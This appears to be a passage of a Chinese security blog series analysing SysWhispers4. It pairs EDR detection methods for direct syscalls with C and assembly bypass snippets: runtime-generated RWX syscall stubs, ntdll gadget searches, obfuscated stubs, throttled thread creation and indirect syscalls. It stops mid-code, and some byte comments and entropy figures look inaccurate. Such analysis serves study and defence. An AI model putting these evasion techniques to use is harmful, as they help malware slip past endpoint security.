---
title: edr绕过工具 SysWhispers4 源码分析系列(十)
url: https://mp.weixin.qq.com/s/lpKjaHtUIpOJBLMlspsPxw
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:33:23.577285
---

# edr绕过工具 SysWhispers4 源码分析系列(十)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnuiaGyrILFoglz2VOy2KUmNvFiaeZwWoPE6xwZlIcxqgsFibjkI3VbicIzkuCd7Jhf7cWpqbgQkib0sib5CuHo5cVJiatUCUd8wibptx6s/0?wx_fmt=jpeg)

# edr绕过工具 SysWhispers4 源码分析系列(十)

原创

haidragon
haidragon

安全狗的自我修养

![]()

在小说阅读器中沉浸阅读

# ![SysWhispers：如何通过直接系统调用实现AVEDR绕过-腾讯云开发者社区-腾讯云](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnulB7zsXfOVrPU4myQNhUTL4giajbpicO4YewR5PEM5ladBSWeubnLTl85x6kQk2JIyMnXmRd9M2sNLpMtbN930cQZqO2lWQNMxw/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0)

# 官网：http://securitytech.cc

#

# 十、EDR 检测与绕过技术深度分析

本文档从攻防双视角深入剖析 EDR 对 Direct Syscall 的检测机制、syscall stub 特征识别、行为分析技术，以及系统性的绕过思路。通过本文档，你将理解现代 EDR 的防御体系并掌握相应的对抗技术。

## 1. Direct Syscall 检测方法

### 1.1 EDR 检测 Direct Syscall 的动机

**为什么需要检测？**

```
1. 传统Hook的失效：
2. ├─DirectSyscall绕过用户态Hook
3. ├─ EDR 无法在 kernel32/ntdll 层拦截
4. ├─恶意行为直接进入内核
5. └─传统监控手段失效

7. 检测动机：
8. ├─恢复对敏感操作的可见性
9. ├─识别绕过企图本身（可疑指标）
10. ├─补充内核层监控的不足
11. └─建立纵深防御体系
```

### 1.2 基于 syscall 指令的检测

#### 方法 1：静态二进制扫描

**原理：**

```
1. EDR 扫描可执行文件的.text 段，查找 syscall 指令序列
```

**检测特征：**

```
1. # EDR 检测规则示例
2. syscall_patterns =[
3. b"\x0F\x05",# syscall 指令
4. b"\x4C\x8B\xD1\x0F\x05",# mov r10, rcx; syscall
5. b"\xB8\x..\x..\x..\x..\x0F\x05",# mov eax, XX; syscall
6. ]

8. def scan_for_syscalls(binary_data):
9. for pattern in syscall_patterns:
10. if pattern in binary_data:
11. return DETECTED
12. return CLEAN
```

**实际案例（CrowdStrike Falcon）：**

```
1. 检测规则：
2. ├─在非 ntdll.dll 模块中发现 syscall 指令
3. ├─ syscall 前没有标准的 prologue
4. ├─存在多个连续的 syscall stub
5. └─ SSN 值异常（超出正常范围）
```

**绕过方法 1：动态生成 syscall**

```
1. // 运行时生成 syscall 指令，避开静态扫描
2. #include<windows.h>

4. typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(
5. HANDLE ProcessHandle,
6. PVOID*BaseAddress,
7. ULONG_PTR ZeroBits,
8. PSIZE_T RegionSize,
9. ULONG AllocationType,
10. ULONG Protect
11. );

13. pNtAllocateVirtualMemory GetSyscallStub(DWORD ssn){
14. // 分配可执行内存
15. LPVOID stub =VirtualAlloc(NULL,0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

17. // 动态生成 syscall stub
18. BYTE shellcode[]={
19. 0x4C,0x8B,0xD1,// mov r10, rcx
20. 0xB8,(ssn)&0xFF,// mov eax, low(SSN)
21. (ssn >>8)&0xFF,
22. (ssn >>16)&0xFF,
23. (ssn >>24)&0xFF,
24. 0x0F,0x05,// syscall
25. 0xC3// ret
26. };

28. memcpy(stub, shellcode,sizeof(shellcode));
29. return(pNtAllocateVirtualMemory)stub;
30. }

32. // 使用
33. autoNtAlloc=GetSyscallStub(0x18);// SSN = 24
34. NtAlloc(GetCurrentProcess(),&base,0,&size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

**绕过方法 2：使用 gadget 链**

```
1. // 不直接使用 syscall，而是调用 ntdll 中的 gadget
2. PVOID FindSyscallGadget(){
3. HMODULE hNtdll =GetModuleHandleA("ntdll.dll");
4. PIMAGE_DOS_HEADER pDos =(PIMAGE_DOS_HEADER)hNtdll;
5. PIMAGE_NT_HEADERS pNt =(PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);

7. PIMAGE_EXPORT_DIRECTORY pExp =(PIMAGE_EXPORT_DIRECTORY)(
8. (BYTE*)hNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);

10. PDWORD pFnArr =(PDWORD)((BYTE*)hNtdll + pExp->AddressOfFunctions);

12. // 扫描所有函数，寻找包含 syscall 指令的 gadget
13. for(DWORD i =0; i < pExp->NumberOfFunctions; i++){
14. BYTE* pFunc =(BYTE*)hNtdll + pFnArr[i];

16. // 检查是否包含 syscall (0F 05)
17. for(int j =0; j <200; j++){
18. if(pFunc[j]==0x0F&& pFunc[j+1]==0x05){
19. return pFunc + j;// 返回 syscall 指令地址
20. }
21. }
22. }

24. return NULL;
25. }

27. // 使用
28. PVOID syscall_gadget =FindSyscallGadget();
29. __asm {
30. mov r10, rcx
31. mov eax,18h
32. call [syscall_gadget]// 间接调用，RIP 在 ntdll 内
33. }
```

#### 方法 2：熵值分析

**原理：**

```
1. 正常的代码段熵值较低（指令有规律）
2. 包含大量 syscall stub 的代码熵值较高

4. EDR 计算.text 段的熵值：
5. Entropy=-Σ(p(x)* log2(p(x)))

7. 如果熵值>阈值→可疑
```

**检测代码：**

```
1. import math
2. from collections importCounter

4. def calculate_entropy(data):
5. counter =Counter(data)
6. length = len(data)
7. entropy =0.0

9. for count in counter.values():
10. p = count / length
11. entropy -= p * math.log2(p)

13. return entropy

15. def detect_syscall_stubs(binary_data):
16. # 计算整个 .text 段的熵值
17. entropy = calculate_entropy(binary_data)

19. # 正常程序熵值：4.5-5.5
20. # 包含大量 stub 熵值：6.0+
21. if entropy >5.8:
22. return SUSPICIOUS

24. # 滑动窗口检测局部高熵区域
25. window_size =0x1000
26. for i in range(0, len(binary_data)- window_size,0x100):
27. window = binary_data[i:i+window_size]
28. local_entropy = calculate_entropy(window)

30. if local_entropy >6.5:
31. print(f"High entropy region at offset 0x{i:X}")
32. return SUSPICIOUS

34. return CLEAN
```

**绕过方法：代码混淆**

```
1. // 在 syscall stub 中插入垃圾指令，降低熵值
2. voidGenerateObfuscatedStub(PVOID pStub, DWORD ssn){
3. BYTE obfuscated_code[]={
4. 0x90,// nop
5. 0x48,0x89,0xE5,// push rbp; mov rbp, rsp
6. 0x4C,0x8B,0xD1,// mov r10, rcx
7. 0x41,0x50,// push r8
8. 0x41,0x51,// push r9
9. 0x52,// push rdx
10. 0xB8, ssn &0xFF,// mov eax, SSN
11. (ssn >>8)&0xFF,
12. (ssn >>16)&0xFF,
13. (ssn >>24)&0xFF,
14. 0x5A,// pop rdx
15. 0x41,0x59,// pop r9
16. 0x41,0x58,// pop r8
17. 0x0F,0x05,// syscall
18. 0x5D,// pop rbp
19. 0xC3// ret
20. };

22. memcpy(pStub, obfuscated_code,sizeof(obfuscated_code));
23. }
```

### 1.3 基于调用模式的检测

#### 异常调用频率检测

**原理：**

```
1. 正常程序：
2. └─ syscall 频率相对稳定
3. └─主要分布在 I/O、内存分配等操作

5. 使用DirectSyscall的程序：
6. └─短时间内大量 syscall
7. └─特别是敏感操作（注入、线程创建等）
```

**EDR 监控实现：**

```
1. // EDR 内核驱动中的监控逻辑
2. typedefstruct _PROCESS_SYSCALL_STATS {
3. DWORD ProcessId;
4. DWORD SyscallCount;
5. ULONGLONG LastResetTime;
6. DWORD SensitiveOpsCount;
7. } PROCESS_SYSCALL_STATS;

9. VOID OnSyscallEntry(PVOID Context, DWORD ProcessId, DWORD Ssn){
10. PROCESS_SYSCALL_STATS* stats =GetProcessStats(ProcessId);

12. // 增加计数
13. stats->SyscallCount++;

15. // 检测敏感操作
16. if(IsSensitiveSSN(Ssn)){
17. stats->SensitiveOpsCount++;

19. // 1 分钟内超过 50 次敏感操作 → 告警
20. if(stats->SensitiveOpsCount>50){
21. AlertSuspiciousBehavior(
22. ProcessId,
23. ABNORMAL_SYSCALL_FREQUENCY,
24. stats->SensitiveOpsCount
25. );
26. }
27. }

29. // 每分钟重置计数器
30. if(GetTickCount64()- stats->LastResetTime>60000){
31. stats->SyscallCount=0;
32. stats->SensitiveOpsCount=0;
33. stats->LastResetTime=GetTickCount64();
34. }
35. }
```

**绕过方法：延迟执行 + 随机化**

```
1. classStealthSyscallExecutor{
2. private:
3. ULONGLONG lastCallTime;
4. DWORD callCount;

6. public:
7. voidExecuteWithDelay(NTSTATUS (*syscallFunc)(), DWORD minDelay, DWORD maxDelay){
8. // 随机延迟（避免模式识别）
9. DWORD delay = minDelay +(rand()%(maxDelay - minDelay));
10. Sleep(delay);

12. // 限制调用频率（每分钟不超过 10 次敏感操作）
13. if(GetTickCount64()- lastCallTime <6000){
14. Sleep(6000-(GetTickCount64()- lastCallTime));
15. }

17. // 执行 syscall
18. syscallFunc();

20. lastCallTime =GetTickCount64();
21. callCount++;

23. // 每 10 次后长延迟
24. if(callCount %10==0){
25. Sleep(5000+ rand()%5000);
26. }
27. }
28. };

30. // 使用
31. StealthSyscallExecutor executor;
32. executor.ExecuteWithDelay(
33. [](){return SW4_NtCreateThreadEx(...);},
34. 100,// 最小延迟 100ms
35. 500// 最大延迟 500ms
36. );
```

### 1.4 基于 RIP 追踪的检测

**原理：**

```
1. 正常 syscall：
2. └─ RIP 应该在 ntdll.dll 中
3. └─因为通过标准 API 调用

5. DirectSyscall：
6. └─ RIP 在应用程序自己的代码段
7. └─因为使用自定义 stub

9. EDR 在内核中记录每次 syscall 的返回地址（RIP）
10. 如果 RIP 不在 ntdll.dll →可疑
```

**内核监控代码：**

```
1. // 在内核 syscall 分发器中
2. VOID KiSystemCall64_Trace(PVOID TrapFrame){
3. ULONG64 rip =TrapFrame->Rip;// 返回地址
4. ULONG64 processBase =PsGetCurrentProcess();

6. // 获取 RIP 所在的模块信息
7. PMODULE_INFO pModule =GetModuleByAddress(rip);

9. // 检查是否在 ntdll.dll 中
10. if(pModule && wcsicmp(pModule->Name, L"ntdll.dll")!=0){
11. // RIP 不在 ntdll 中 → 可能是 Direct Syscall
12. LogSuspiciousSyscall(
13. PsGetCurrentProcessId(),
14. rip,
15. pModule ? pModule->Name: L"Unknown"
16. );

18. // 如果是敏感 SSN，直接告警
19. if(IsSensitiveSSN(TrapFrame->Rax)){
20. SendAlertToServer(
21. ALERT_DIRECT_SYSCALL,
22. PsGetCurrentProcessId(),
23. rip
24. );
25. }
26. }
27. }
```

**绕过方法 1：Indirect Call**

```
1. ;SysWhispers4Indirect方式
2. EXTERN syscall_gadget:QWORD

4. SW4_NtAllocateVirtualMemory PROC
5. mov r10, rcx
6. mov eax,18h
7. jmp qword ptr [syscall_gadget];跳转到 ntdll 中的 gadget
8. ; RIP 显示在 ntdll.dll 内
9. SW4_NtAllocateVirtualMemory ENDP
``...